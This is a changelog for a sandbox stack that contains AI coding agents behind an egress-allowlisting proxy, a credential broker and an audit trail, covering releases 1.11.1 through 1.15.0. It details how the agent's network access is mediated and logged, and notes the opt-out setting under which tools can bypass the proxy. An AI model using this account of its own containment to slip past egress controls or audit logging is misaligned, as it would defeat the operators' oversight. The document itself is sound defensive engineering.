# Changelog

Notable changes per release, and what you have to do to move between them.

The format is loosely [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
This project versions the **security boundary**, not the code: a major bump
means the guarantees changed or an upgrade needs manual steps to stay safe.

---

## 1.15.0 — 2026-08-22

The proxy records what it permitted, not only what it refused. A minor because
**the proxy image changes** and the trail gains an event type — anything reading
it sees a shape it has not seen before. The boundary itself is unchanged: no
control was added, removed or relaxed.

### Added

**`001_allowlist.py` emits `allowed` alongside `blocked`.** It had one event
type, and everything in the trail that said *something worked* — `cred_injected`,
`token_injected` — came from a bank entry's addon rather than from the stack. So
a deployment with no entry installed had a trail **structurally incapable of
recording anything but denials**: able to say what the agent was stopped from
doing and never what it did. That is not a corner case; it is the ordinary shape
for anyone running a client that authenticates itself.

```json
{"ts":"…","service":"proxy","event":"allowed","reason":"allowlist","host":"api.anthropic.com","method":"POST"}
```

What it cost in practice, from the lab that prompted this: Remote Control was
failing, and the trail showed 29 `blocked … method=PUT` lines and nothing else.
That session creation and reads had *succeeded* — which is what made it an
allowlist line needing `PUT` rather than a credential problem — lived only in
`docker compose logs proxy`, which log-rotator does not manage, observer does not
serve, and which vanishes when the container is recreated.

**Host and method only, never the path.** This addon is in the base image and
sees hosts it knows nothing about, so it cannot compute a safe slice of a path
the way a provider's addon can — a vendor carrying its credential in the URL
(Telegram's `/bot<TOKEN>/…`, an `?access_token=`) would have that credential
written into a trail `observer` serves over HTTP with no auth. `host` and
`method` are the two fields `blocked` already carried, so this adds **no new
exposure surface at all**: the same shape, for the other outcome. Path-level
detail still exists where it is safe to have it, as a provider addon's
`cred_injected endpoint=/v1/messages`.

**CONNECT is not recorded.** Every HTTPS request reaches this addon twice — the
CONNECT that opens the tunnel, then the inner request — so logging both would
double the trail to say `method=CONNECT`, which is never the agent's intent and
is not what any allowlist entry is written against. The skip is scoped to the
permitted path: a *refused* CONNECT has no inner request to stand in for it and
is still recorded.

**Permissive mode logs too**, as `reason=permissive`. Otherwise the deployment
with no egress policy would have been the one whose trail said the least about
its egress, and a reader could not tell "a rule permitted this" from "nothing is
enforcing".

### Upgrading

**Repin and rebuild the proxy.** This one arrives by repinning rather than by
editing a file: `001_allowlist.py` has been baked into the proxy image since
1.10.0, so a deployment picks it up when it rebuilds from the new tag, and a
vendored copy in `proxy/` is dead weight the entrypoint already ignores.

**Expect the trail to grow, and check nothing reading it assumes one event
type.** Measured on one lab: 206 proxied requests in 5m11s — mostly idle, and
inflated by the retry storm above — which sustains to roughly 57k events/day at
~7.5 MB/day. `log-rotator` already ships `daily`, `maxsize 50M`, `rotate 14`,
`compress`, so the ceiling holds with room to spare and **no config change is
needed**. A `grep` for `"event":"blocked"` is unaffected; anything counting
lines, or treating every proxy line as a denial, is not.

**There is no way to turn it off**, and that is deliberate rather than an
oversight — a trail that records only refusals is the defect this fixes, so an
opt-out would ship the defect as a setting. If volume is the concern, the knob
is `log-rotator`, not the addon.

**The observer is unchanged, and gets busier.** `allowed` will dominate the
trail, `server.js` keeps a 200-event replay backlog and `dashboard.html` has no
event filter, so the live view is noisier than it was. That is not a loss of
record: the backlog is display-only, and the durable trail is the JSONL on the
`audit-logs` volume, complete either way.

---

## 1.14.5 — 2026-08-19

`bank/anthropic`'s OPTIONAL block describes the client people are running.
Comments only, in one file — no uncommented line changes, no `hosts` change, and
the boundary is exactly what it was.

### Fixed

**The OPTIONAL block offered a host the current client never contacts and
omitted two it does.** Measured on one lab — Claude Code 2.1.234, every host
that appeared in its audit trail over one run:

```
# downloads.claude.ai     GET     # in-place auto-update
# statsig.anthropic.com   POST    # feature flags
# sentry.io               POST    # error reporting
# http-intake.logs.us5.datadoghq.com   POST   # client telemetry
```

`downloads.claude.ai` is the auto-updater, which retried and failed 32 times in
that run. It ships with the reason **not** to enable it: a lab that pins
`CLAUDE_VERSION` gets its updates from a rebuild, so blocked is the right
default and the only cost is a noisy trail. `DISABLE_AUTOUPDATER` in the lab
quiets it without opening egress, which is the cheaper way to buy silence.

`http-intake.logs.us5.datadoghq.com` is client telemetry, and naming it matters
because `sentry.io` was already here under "error reporting" — anyone who
enabled that line to quiet telemetry blocks would have found it changed nothing.
The `us5` shard is per-account, so the comment says to copy what your own trail
shows rather than trusting the literal.

`statsig.anthropic.com` keeps its line and gains the finding: never contacted in
that run, with 2.1.x fetching its gates over `api.anthropic.com` instead
(`GET /api/claude_code` and `POST /api/event_logging`, both credentialed).
Annotated rather than deleted — one lab is thin evidence for removing an option,
and a commented line costs nothing.

The evidence is scoped in the file itself. A list of hosts one client generation
contacted over one run is not a claim about the product, and the block says so
rather than reading as settled.

Two hosts stayed out on purpose. `raw.githubusercontent.com` appeared blocked
nine times, and the proxy logs host and method with no path — so the trail
cannot say whether that was the client fetching a plugin marketplace or the
agent's own work, and an allowlist line justified by a guess is the wrong kind.
The Remote Control transport hosts are absent for a different reason: the
follow-up that measured them concluded the blocker is the scope of the
credential the broker holds, not egress, so no line here would help.

### Upgrading

**Nothing to do**, and nothing to rebuild. No image, addon, provider file or
manifest changed.

An entry's allowlist is copied into the deployment at install time, so a
deployment that already has `bank/anthropic` installed holds its own copy and
will not pick these comments up. Nothing behaves differently for it — every
line involved is commented on both sides. If you want the annotations, diff your
`/etc/agent-allowlist` against the entry. And enabling any line still means
restarting the proxy: it reads the allowlist once, at startup.

---

## 1.14.4 — 2026-08-18

The lab container gets a working directory. No image changed — this release is
one key in three compose files, and the lint that keeps it there.

### Fixed

**The lab had no working directory at all.** No compose file set `working_dir`,
no lab `Dockerfile` set `WORKDIR`, and neither base image sets one either, so
`Config.WorkingDir` was empty and the container started in `/` — both for the
container's own command and for a `docker compose exec` given no `--workdir`.

That is invisible for as long as the command is `sleep infinity` and whoever
arrives `cd`s on the way in. It stops being invisible the moment an agent *is*
the command: run Claude Code that way and it takes `/` for its project — asks to
trust `/`, and files its per-project state under that key rather than the
workspace's. Reported against a `sal`-managed lab pinned to 1.14.2 whose
`compose.override.yaml` runs the agent as the lab's command; its `.claude.json`
had exactly one project key, `"/"`.

`working_dir: /workspace` does both jobs, measured against compose v5.1.4 rather
than assumed: it sets the container's `WorkingDir`, so the command starts there,
and it becomes the default for `docker compose exec`, so a shell lands there
too. One key covers both ways in.

Three files take it — `stack/compose.yaml`, `template/deployment/compose.yaml`
and `examples/dev-container/.devcontainer/compose.yaml`. The dev-container
example needs it despite `devcontainer.json` already setting `workspaceFolder`:
that covers the terminals VS Code opens, and neither the container's command nor
a hand-run `exec`. `examples/claude-code` is deliberately left alone — its lab
image carries a `WORKDIR` of its own and its project mount is commented out for
whoever copies it to fill in.

The new suite in `tests/integration/00-config-lint.test.sh` is conditional on
the mount for that reason: a lab that mounts a workspace must name it as its
working directory, and a lab that mounts none is skipped. That excludes
`examples/claude-code` by rule rather than by list, so the next deployment shape
added is judged on what it mounts.

### Upgrading

**Add `working_dir: /workspace` to the `lab` service of your own
`compose.yaml`.** Repinning does not deliver this one: the template is a file
you copied, not something fetched at build time, so the fix reaches an existing
deployment only by hand. It matters if anything in your stack runs an agent as
the lab's command — an `sal`-managed lab with a `compose.override.yaml`
`command:`, or any `docker compose run` — and is cosmetic otherwise.

If an agent has already been running in `/`, it has per-project state filed
under that key. For Claude Code that is a `"/"` entry in `~/.claude.json`
holding the trust decision and history; moving to `/workspace` starts a fresh
one, and the old entry can be dropped.

**Nothing to rebuild.** No image, bank entry or provider file changed.

---

## 1.14.3 — 2026-08-17

The stacks tier stops leaking images. Nothing in any image, template or bank
entry changed — this release is one test file, and the last of the leaks 1.14.1
started on.

### Fixed

**`tests/stacks/20-boundary.test.sh` never removed the images compose built.**
1.14.1 fixed the containers, the networks and the volumes; the images were the
one resource left, and the tag list grew without bound — 237 over 28 run ids on
one machine here. `teardown` now passes `--rmi local` to `down`, and
`sweep_stale` picks up what a `kill -9` left behind, last in that function
because `docker rmi` refuses an image a container still holds.

Keeping them was never buying anything, which is what makes this a fix rather
than a trade. The project name carries `$$`, so compose tags what it builds
`sattest-<pid>-<shape>-<service>` — unique per run, and the next run cannot
reuse it whatever we do. `docker rmi` drops the tag and not the build cache, so
the rebuild is free: two consecutive full runs measured 93s and 98s, the second
starting with every image the first had built already deleted.

The 1.14.1 entry said deleting 111 volumes and 237 images reclaimed roughly
nothing, and that still holds — this is not a disk fix. It is the same argument
as the networks: a resource this suite creates on every run and never removes is
a number that only goes up, and the cost of finding out where the ceiling is
gets paid by whoever runs the suite next.

The sweep anchors on `^sattest-` and deliberately not `^sat-test-`. One hyphen
apart and opposite in kind: the stacks tier's are run-scoped and unbounded, the
integration tier's are fixed-name and reused across runs *on purpose*, as that
tier's build cache. Widening the anchor would quietly turn every stacks run into
a full rebuild of the other tier.

### Upgrading

**Nothing to do**, and nothing to rebuild. No image, template or bank entry
changed. If you have `sattest-*` images left over from before, the next
`tests/run.sh stacks` sweeps them.

---

## 1.14.2 — 2026-08-17

`bank/anthropic` ships the egress Claude Code actually needs. One line in one
bank entry, plus the playbook section that would have caught it.

### Fixed

**`bank/anthropic/allowlist` listed only `api.anthropic.com`**, so installing
the entry produced a lab where the credential was fetched, injected and audited
correctly, and the agent refused to start. Claude Code 2.x calls
`GET platform.claude.com/v1/oauth/hello` before it will run and treats failing
it as fatal.

The entry now ships that host:

```
api.anthropic.com       GET,POST
platform.claude.com     GET
```

**In the allowlist and deliberately not in `hosts`.** The endpoint answers 200
unauthenticated, so it is a destination the agent must *reach*, not one the
credential should be attached to — and `bank/anthropic/proxy/anthropic.py`
compares `flow.request.host` to `"api.anthropic.com"` exactly, so nothing is
injected for it. Adding it to `hosts` would have widened where a real token is
sent, for nothing.

Worth naming because of how it presents. The user sees the *proxy* blamed:

```
Unable to connect to Anthropic services
Failed to connect to platform.claude.com: Status 403
```

That 403 is `001_allowlist.py` refusing. So the symptom of a missing allowlist
line reads as a credential or a TLS problem, on a stack where the credential is
fine — the same misdirection the 1.13.0 entry described for a missing `METHODS`
column, one host over. The matching `{"event":"blocked","reason":"allowlist"}`
line in the trail is what says otherwise, and is the thing to check first when a
freshly installed provider will not start.

### Changed

**`PLAYBOOK.md`'s "things that belong in the allowlist and not in `hosts`" is
now four**, gaining *the client's own startup checks, which are rarely on the
API host*. The other three are structural — a protocol conflict, an addon
answering locally, a multi-tenant suffix — and you can reason your way to them
from the files. This one you cannot: it is a property of the vendor's client,
not of their API, and their API documentation will not mention it. The section
now says to find it by running the client once against a real allowlist and
reading the `blocked` lines out of the trail.

`raw.githubusercontent.com`, also blocked at Claude Code startup but not fatal,
was considered and not added. It is already in `bank/github/allowlist` under
OPTIONAL, alongside `codeload` and `objects.githubusercontent.com`, which is its
correct home: it is GitHub egress, and it is multi-tenant.

### Upgrading

**Only if you installed the `anthropic` bank entry and mount an allowlist.** Add
the line to your deployment's `/etc/agent-allowlist`, or recopy
`bank/anthropic/allowlist`, then:

```bash
docker compose up -d --force-recreate proxy
```

The `--force-recreate` is not optional here. The proxy reads the allowlist once,
at startup, and the file is a bind mount — so a plain `docker compose up -d`
sees no config change and the container keeps the ruleset it already has, with
no indication that your edit did nothing.

No image changed. Deployments running without an allowlist file are permissive
and were never affected.

---

## 1.14.1 — 2026-08-17

The stacks tier cleans up after itself. Nothing in any image, template or bank
entry changed — this release is one test file.

### Fixed

**`tests/stacks/20-boundary.test.sh` never tore anything down.** `teardown`
iterated a `PROJECTS` array that `up` appended to, but `up` prints the project
directory on stdout, so every caller invokes it as `dir=$(up "$label" "$src")`
— a command substitution, and therefore a subshell. The append never reached
the parent, the array was empty on every run, and `docker compose down -v` had
never run once, for any shape, since the suite was written.

The comment above the trap is the part worth reading: it explains that leaked
networks exhaust Docker's default address pools and that a later run then fails
with *"all predefined address pools have been fully subnetted"* — which looks
like a broken stack and is not. The mechanism written to prevent exactly that
was inert.

It stayed hidden because `sweep_stale` masks it. Each run deletes the *previous*
runs' containers and networks at startup, so the only visible symptom is the
most recent run's containers still up after a green suite — which is how it was
finally noticed.

`teardown` now derives the projects from `$WORK`. Everything under it is a
project this suite created, so the filesystem is both simpler and harder to get
wrong than an array that has to survive the right calling convention — and `up`
cannot stop being called in a substitution, because printing the directory is
its interface.

**`sweep_stale` swept containers and networks but not volumes**, so a run that
died without teardown leaked its volumes permanently. One machine here had 111
across 28 run ids. They are small — near-empty audit logs and a CA cert — which
is why this never showed up as disk pressure and simply grew. For calibration,
deleting all 111 plus 237 stale images reclaimed roughly nothing: every run
built the same Dockerfiles at the same pinned tag, so the images were identical
layers wearing different tags, and the per-image size double-counts the shared
base.

**`KEEP_STACK=1` deleted the working directory anyway.** The loop skipped the
teardown and fell through to `rm -rf "$WORK"`, so the stacks it deliberately
left running had no project directory left — and `docker compose logs` against
a deleted directory is not a thing. Poking at those stacks is the entire point
of the flag. It now keeps `$WORK` and prints where it is.

### Upgrading

**Nothing to do**, and nothing to rebuild. No image, template or bank entry
changed. If you run `tests/run.sh stacks` from a clone, it now leaves no
containers, volumes or networks behind; if you have leftovers from before,
the next run sweeps them.

---

## 1.14.0 — 2026-08-17

A bank entry's `lab_setup` fragment has somewhere to run. No boundary change —
a minor because the **lab image gains an entrypoint** and the deployment gains
a mount, which is a change to the shape of the thing people copy.

### Added

**`lab/setup.d/` and an entrypoint that runs it.** `lab_setup` was the one part
of a bank entry `template/deployment/` had no mechanism for. `./lab` is a build
context, the Dockerfile copied nothing into the image, and `command: sleep
infinity` would not have run a fragment if one had been there. So the two
entries that ship one installed cleanly and did not work:

- `bank/github/lab/setup.sh` wires the git credential helper and sets
  `credential.useHttpPath false`, without which git puts the repo path in the
  lookup key and the gateway's exact-match route cannot satisfy it.
- `bank/gcp/lab/setup.sh` writes the inert ADC file that lets a Google client
  library's credential chain reach a token exchange the proxy can answer.
  Without it the chain raises before opening a socket.

The lab image now carries `entrypoint.sh`, which runs every `*.sh` in
`/etc/agent-setup.d` in filename order and then execs the container's command.
The deployment mounts `./lab/setup.d` there, read-only. In the image rather than
the deployment because a fragment nothing runs is not an installed provider, and
a deployment should not have to supply that mechanism itself — the same
reasoning that puts `000_policy.py` in the proxy image.

One file per provider, named for it, because the path inside an entry is fixed
(`lab/setup.sh`) and two entries would collide. Installing is a copy, and
uninstalling is deleting the file — which is the whole reason it is a directory
of files rather than a shared file an installer edits and later has to unpick.

On start rather than on create, so adding a provider to a running deployment is
a file plus a restart, never a rebuild. A fragment that exits non-zero stops the
container: a lab that comes up with a provider installed and unconfigured is the
failure the mechanism exists to prevent.

**Ordering is alphabetical by filename** — `gcp.sh` before `github.sh`. Nothing
shipped depends on it; no two fragments interact. The entrypoint sorts under
`LC_COLLATE=C`, so a deployment or installer that starts emitting `NNN_<name>.sh`
gets numeric ordering with no change to the image.

### Fixed

**The two shipped fragments said they were sourced. They are executed.** Every
effect either one has is a file it writes, and neither exports anything, so a
child process suffices. Sourcing would put each fragment's `set -euo pipefail`
into the entrypoint's own shell and let a stray `exit` kill it — and it would
buy nothing even for a fragment that wanted it, because `docker exec` builds its
environment from the container's config rather than from PID 1, so an export in
an entrypoint never reaches an agent that shells in. A fragment needing an
agent-visible variable writes `/etc/profile.d/`, or its entry declares
`lab_env`.

`bank/gcp/lab/setup.sh` also goes 644 → 755, so the two entries stop differing
over a permission bit the entrypoint deliberately does not depend on: it invokes
`bash` explicitly, since a mount can flatten the bit regardless.

**`PLAYBOOK.md` step 7 named a file the template does not ship.** It said to
"copy it into your `lab/` and make sure your `setup.sh` runs it" — there is no
`setup.sh` in `template/deployment/`, and the "Generating a stack" section never
described a lab setup mechanism at all. Both now say where the fragment goes and
that nothing else needs wiring.

**The schema's `lab_setup` description** said "on create" and said nothing about
how the fragment is invoked. Description-only, so no `schema_version` bump.

Reported as [#107](https://github.com/lpezet/secure-agent-lab/issues/107), the
last item on [`sal`](https://github.com/lpezet/secure-agent-lab-cli)'s 1.0 list
that could not be solved from that side.

**Not a boundary fix, despite how it reads.** The report framed an unconfigured
`gh` as silently leaving the proxy path. Under the default it does not — the
`lab` network is `internal: true`, so there is no default gateway and ssh has no
route out at all; it fails closed. The claim holds only under
`LAB_INTERNAL=false`, where egress mediation is knowingly off, every tool can
bypass the proxy, and `check-invariants.sh` reports the opt-out on every run.
What was actually wrong is that two of four entries installed non-functional and
nothing said so.

### Upgrading

**Rebuild the lab image**, which is what carries the entrypoint. If you are
adopting the new template files, add the mount to your lab service:

```yaml
    volumes:
      - ./lab/setup.d:/etc/agent-setup.d:ro
```

Mount `./lab/setup.d`, **not** `./lab` — that directory is also the build
context and holds `entrypoint.sh`, which a `*.sh` glob would pick up and run
inside itself.

Then, for each installed provider whose entry declares `lab_setup`, copy the
fragment to `lab/setup.d/<name>.sh`. If you already run those steps some other
way — a devcontainer `postCreateCommand`, an entrypoint of your own — nothing
forces you to move; the directory is simply empty, and the entrypoint says so
and carries on.

---

## 1.13.1 — 2026-08-16

The provider skeleton ships the egress file 1.13.0 gave every other entry. No
boundary change.

### Fixed

**`template/provider/static-key/` now has an `allowlist`.** 1.13.0 gave every
bank entry one so that installing an entry no longer produced a lab that could
not use it — and left the skeleton without, so an entry scaffolded from it
landed in exactly the state that release was about.

The person hitting that is the least equipped to diagnose it: someone writing
their first provider, whose broker file and addon are both new, whose requests
are being denied by a third file nobody mentioned, and whose natural next move
is to copy `hosts` into the deployment's allowlist — which is the bare-hostname
trap 1.13.0's own entry describes, defaulting to `GET,HEAD,OPTIONS`.

The skeleton's copy is written for a first-time author rather than lifted from a
bank entry: one placeholder line, and comments carrying the three things that
are not guessable from the syntax — state the METHODS, do not derive the file
from `hosts`, and `hosts` is a different list whose asymmetry runs one way only.

**Suite E composed the wrong path for a skeleton.** It built
`bank/<name>/allowlist` out of `.name`, which is correct for a bank entry, where
the directory and the name are the same string, and wrong for a skeleton, whose
directory names its *shape* (`static-key`) while `.name` is the placeholder the
author renames (`acme`). Widening the loop with no file present reported a
missing file at `bank/acme/allowlist` — a path nothing was ever going to write,
and one that sends an author looking in the wrong directory. Both suites C and E
now derive it from the manifest's own directory, as suite B already did.

Shipped in 1.13.0 and unreachable until now, since neither suite looked at a
skeleton.

### Changed

**Suites C and E cover `template/provider/*` as well as `bank/*`.** Suite E was
the check the skeleton fell out of — the reason this was possible at all — but
suite C was `bank/`-only too, benign only because the skeleton exposes no route
and so passes on the "declares none and ships no `.conf`" branch. Both are
widened, which makes `template/provider/README.md`'s claim that skeletons are
"validated like real entries" true for every suite rather than for most of them.

Reported as [#104](https://github.com/lpezet/secure-agent-lab/issues/104), from
the [`sal`](https://github.com/lpezet/secure-agent-lab-cli) side, where
`sal providers create` had been telling the author the skeleton ships no
allowlist — a patch over the gap rather than a fix for it.

### Upgrading

**Nothing to do**, unless you scaffolded a provider from the skeleton since
1.13.0 and it has never worked. In that case the missing piece is egress, not
your credential: give the entry an `allowlist` naming its hosts *with methods*,
and copy those lines into the deployment's `/etc/agent-allowlist`.

---

## 1.13.0 — 2026-08-16

A bank entry now ships the egress it needs. No boundary change — a minor
because the entry *directory convention* changed, and an installer consuming
the bank needs to know there is a new file to copy.

### Added

**`bank/<name>/allowlist`** — the hosts an entry needs, in the allowlist's own
syntax, for all four entries.

Installing an entry produced a lab that could not use it. The entry brought its
broker provider, its addon and its credential wiring, and then every request it
made was denied, because the deployment's allowlist is the operator's and
nothing seeded it. So the operator had to work out, per provider, both the
hostnames and the methods.

The methods are the bad case. `hosts` carries none, and `001_allowlist.py`
defaults an entry with none to `GET,HEAD,OPTIONS` — so the obvious guess

```
api.anthropic.com
```

is syntactically fine, reads as correct, and blocks every request Claude Code
makes, all of which are POSTs. The symptom is every call failing on a freshly
installed provider, which reads as "the credential is wrong".

A file rather than a manifest field, deliberately. `provider.schema.json` is
`additionalProperties: false`, so **any** new field makes a conforming older
installer refuse every manifest — a `schema_version` bump, which by that
field's own contract should happen on the order of never. An entry is already a
directory of files and the directory is not governed by that rule: an older
installer does not copy the file and behaves exactly as it did before. The file
also gets comments, which is how an optional host expresses itself — no
`required: true|false` to design, no precedence to write down, the default is
deny, and the reason sits next to the host.

Not folded into `hosts` either, which is the same objection from the other end.
`hosts` is where the addon **attaches a credential**; the allowlist is where the
lab **may send a request**. `github.com` belongs in the second and must never
appear in the first, and `*.workers.dev` is reasonable to make reachable and a
serious bug to inject for. Keeping the lists apart makes that un-writable rather
than merely discouraged.

Three things in the shipped files are worth reading before writing your own:
`bank/github/allowlist` carries `github.com` uncommented and *not* in `hosts`,
because that entry ships the git credential helper; `bank/gcp/allowlist` lists
`sts.` and `oauth2.googleapis.com` even though `040_gcp.py` answers them
locally, because `001` runs first and a denied destination never reaches the
addon that would have answered it; `bank/cloudflare/allowlist` carries
`*.workers.dev` commented, as the clearest case of reachable-but-never-injected.

Suite E in `00-config-lint` enforces the direction that is silent: every host in
`hosts` appears **uncommented** in the entry's allowlist. A host the addon
injects into but the lab cannot reach is a credential minted, audited as issued,
and never spent. The reverse is deliberately not checked — requiring
`allowlist ⊆ hosts` would make the dangerous direction the tidy one. It also
fails an entry that omits METHODS.

Requested as [#99](https://github.com/lpezet/secure-agent-lab/issues/99), and
installed by [`sal`](https://github.com/lpezet/secure-agent-lab-cli) from the
other side.

### Removed

**`stack/proxy/allowlist.sample`.** The docs stopped pointing at it in 0.2.0
and the file was never deleted; the only remaining reference in the tree was
the CHANGELOG line recording that deprecation. Every line in it was a bare
domain, so anyone still finding it copied the exact failure above.
`stack/compose.yaml`'s commented allowlist mount now says where to look
instead — `template/deployment/allowlist` for the syntax, each bank entry's own
file for its hosts and methods.

### Changed

**The schema's `hosts` description.** It claimed "Load-bearing: seeds
`001_allowlist.py`", which has not described anything since the allowlist
became a file the deployment owns. It now says what `hosts` is for and what it
is not. Description-only, so no `schema_version` bump — that field's contract
excludes rewording.

**`PLAYBOOK.md` step 8 no longer says to append the entry's `hosts`** to the
allowlist, which was this repo recommending the trap. It says to copy the
entry's `allowlist` lines verbatim, and a new "Working out an entry's egress"
section says how to derive them for an entry you are writing.

### Upgrading

**Nothing to do**, and nothing changes for a deployment that already works —
an allowlist you have already tuned is already correct by definition.

If you installed an entry and something has never worked, this is worth
re-reading: compare your `/etc/agent-allowlist` against the entry's
`bank/<name>/allowlist` and check the methods column, not just the hostnames.

---

## 1.12.1 — 2026-08-16

The observer dashboard connects on a lab that has not logged anything yet. No
boundary change.

### Fixed

**`/events` sends its response headers immediately.** `res.writeHead()` puts
nothing on the wire — Node holds headers until the first `res.write()` or
`res.end()` — and the SSE handler writes the backlog and nothing else. On a
deployment that had not yet emitted an audit event the backlog was empty, so
the response never started: no headers, no body, no error. `EventSource` fired
neither `onopen` nor `onerror`, and the dashboard sat on its initial
`connecting…` until something happened to be logged.

It cleared itself the moment anything was, and never recurred on that
deployment, which is why it survived: the window is exactly the first time an
operator opens the dashboard on a lab they have just created. For an audit
trail specifically that is the wrong signal — "no events" and "not receiving
events" are the two states it exists to distinguish, and it rendered the first
as the second. Non-browser readers of `/events` were affected the same way,
since any HTTP client blocks waiting for response headers.

`stack/CLAUDE.md` already documented the intended behaviour ("the SSE
connection should flip to 'connected' as soon as `/events`' response headers
land, independent of whether the backlog has anything in it yet"); the code is
now what that describes.

Reported as [#98](https://github.com/lpezet/secure-agent-lab/issues/98), with
a standalone repro that needs no deployment.

### Upgrading

**Nothing to do.** Rebuild `observer` to pick it up; a running dashboard that
already shows events was never affected.

---

## 1.12.0 — 2026-08-16

The deployment template names no provider. No boundary change — a minor
because the template's *contract* changed, and anyone consuming it needs to
know.

### Changed

**`template/deployment/compose.yaml` declares nothing provider-specific.** It
carried five credential paths on the broker, a Cloudflare profile on two
services, a GCP service account on the proxy, and five placeholder variables
on the lab. Every one of them is already declared by
`bank/<name>/provider.json` under `secrets[]`, `config` or `lab_env` — that
last field has existed all along, and all four bank entries populate it.

A restated constant is a copy that can stop matching its source, and this one
**wins**: `environment:` takes precedence over `env_file:`, so a value in the
template overrides whatever the operator set. The paths agreed, which is what
made it hard to see — the day a manifest changes a filename, the deployment
keeps reading the old path while the broker reports the credential as absent.
Same shape as the vendored-addon hazard 1.10.0 closed.

Two mechanisms replace them. **The proxy loads `.env`**, which is why the file
named Cloudflare and GCP in the first place: with no `env_file`, `.env` could
only reach that service through a named pass-through. **The lab loads
`lab.env`** — deliberately a different file, because that container is the
untrusted side and `.env` holds the operator's host paths and app ids. Nothing
in `lab.env` is ever a credential; the values exist so a client library's own
"am I authenticated?" check passes, and the lint fails on a real one.

`00-config-lint` now derives the forbidden set from `bank/*/provider.json`, so
a new entry extends the check rather than needing it updated. Examples are
exempt and stay exempt: an example *is* a specific deployment, and a deployment
naming its own providers is honest wiring.

Reported from the [`sal`](https://github.com/lpezet/secure-agent-lab-cli) side
(#95), where this was the last thing standing between that tool and using this
template verbatim instead of generating a service graph of its own.

### Upgrading

**Only if you adopt the new template file.** An existing deployment keeps its
own `compose.yaml`; repinning changes which images it builds, not what that
file says, so nothing breaks by upgrading alone.

If you do adopt it, move each installed entry's variables out of `compose.yaml`
and into the two env files. `bank/<name>/provider.json` says which go where:

| the manifest says | it goes in |
|---|---|
| `secrets[].env` + `secrets[].file` | `.env`, as `VAR=/secrets/<file>` |
| `config` | `.env` |
| `lab_env` | `lab.env` |

`lab.env` must exist even if empty — compose refuses to parse a file whose
`env_file` is missing, including for a service it is not starting.

---

## 1.11.3 — 2026-08-16

The audit trail is greppable again. No boundary change.

### Fixed

**`audit.py` now emits compact JSON, like the other two writers.** Three
services write the trail into one file, and two agreed on formatting:
`audit.js` uses `JSON.stringify` and cred-gateway's `log_format` is
hand-written, both compact. `audit.py` used `json.dumps` with its default
separators, so it alone emitted `"event": "blocked"` where the others emitted
`"event":"blocked"`.

Both are valid JSON and `observer` parses per line, so nothing was broken. But
a `grep` written against one service's lines returned nothing for the others —
which reads as an absence of events rather than a formatting difference, and
cost time three separate times here.

`audit.py` is the one that moved because it is the minority of three, and
because the precedent was already set: both writers' *timestamp* comments say
they match cred-gateway's nginx `$time_iso8601` rather than their language's
default. nginx sets the format, being the writer that cannot be argued with.

### Added

**`PLAYBOOK.md` now says what a trail line is** — one compact JSON object per
line, `ts` / `service` / `event` first, `%Y-%m-%dT%H:%M:%S+00:00` with no
milliseconds. Nothing stated this anywhere before, which is how three writers
came to agree only by coincidence. `00-config-lint` asserts all three are
compact, so a fourth writer that drifts fails rather than being noticed later.

### Upgrading

**Nothing to do**, but check any tooling of your own that string-matches the
trail. A filter written for the proxy's old spaced form — `"event": "blocked"`
— stops matching; one written for the broker's or cred-gateway's compact form
now matches everything. Anything using a real JSON parser is unaffected either
way.

---

## 1.11.2 — 2026-08-16

An audit-trail fix. No boundary change: nothing that was blocked became
allowed, and nothing that was allowed became blocked.

### Fixed

**An addon no longer acts on a request an earlier addon has already refused.**
mitmproxy calls every addon's `request` hook whether or not the flow has been
answered, and nothing checked. Two consequences, both of them the trail
asserting something that did not happen:

`001_allowlist.py` runs after `000_policy.py` and also denies an internal host
— no allowlist lists `broker` — so it overwrote the policy addon's response.
A deployment with an enforcing allowlist recorded `reason=allowlist` for an
agent probing the credential broker. Those are different events to whoever
reads the trail, and the more serious one was the one being lost.

Worse, and not in the original report: an **injection** addon after a denial
also ran. With an allowlist that does not list `api.anthropic.com`:

```json
{"event":"blocked","reason":"allowlist","host":"api.anthropic.com"}
{"event":"cred_injected","provider":"anthropic","cred_type":"api_key"}
```

The broker was called for a credential that was never spent, and the trail
claims an injection into a request that never left. For a stack whose point is
that you can see what the agent spent, a trail describing a spend that did not
happen is the failure that matters.

The fix is `if flow.response is not None: return` as the first line of every
addon that acts on a request, in `001_allowlist.py`, all four bank entries and
the `static-key` skeleton. Deliberately dependency-free: deployments vendor
these files at pins that may predate any shared helper, which is the same
constraint that shaped the 1.9.2 hostname fix.

`000_policy.py` is exempt. It is the first decision by construction, so it has
nothing to defer to, and it is the one addon that must never stand aside.

Reported from the [`sal`](https://github.com/lpezet/secure-agent-lab-cli) side
via the new `stacks` tier, which is what noticed the wrong message (#87).

### Upgrading

**Re-vendor your proxy addons** if you have installed any bank entry. The base
addons come from the image and need nothing; the provider addons are files your
deployment owns, so `scripts/check-drift.sh` will report them once you repin.

Until you do, the boundary is unchanged — what you lose is trail accuracy on a
deployment with an enforcing allowlist, or one whose allowlist denies a host an
injection addon matches.

---

## 1.11.1 — 2026-08-15

The shapes this repo ships are now run, not only read. No boundary change.

### Added

**`tests/stacks/` — a third tier.** `00-config-lint` reads the files a
deployment is made of; nothing ran them. Three releases in a row shipped
changes whose runtime behaviour nothing here verified: the baked-addon
entrypoint (1.10.0), `${OBSERVER_PORT-9000}` and `profiles: ["observer"]`
(1.10.2), and the move to `template/deployment/` (1.11.0). The middle two were
taken on a reporter's compose output rather than on anything in this repo.

Two bands. `10-compose-config` builds nothing and runs in about a second — it
asks compose what the files *mean*: that an unset `OBSERVER_PORT` publishes
9000 and an empty one publishes nothing, that an absent `COMPOSE_PROFILES`
drops the observer while the services writing the trail stay, and that a
disabled profile is still declared. `20-boundary` brings the template and both
examples up from their own compose files, with images compose builds **from the
tag each one pins**, and checks the boundary from the `lab` network.

That second band is the only thing anywhere that notices a repin landing badly
— every other tier builds its containers by hand. Its assertions are the
credential-free subset of the checks each example's README already documents,
so it proves those READMEs true rather than inventing a second set. `lab` is
never started: its image is a slow local build and its `setup.sh` fetches a
GitHub App identity, so it is *supposed* to fail without credentials.

Free, and needs no credentials, so both bands run on every pull request
alongside the existing jobs (10s and 72s respectively).

### Fixed

**The egress allowlist's `.env.example` and the port binding are now
verifiable.** Beyond confirming what 1.10.2 claimed, one result is stronger
than the argument made for it: a value trying to widen the observer's port
binding does not merely fail to escape the literal `127.0.0.1` prefix — compose
**rejects the file outright** with `invalid IP address`.

### Known

**An internal-host block is attributed to the allowlist in the audit trail**
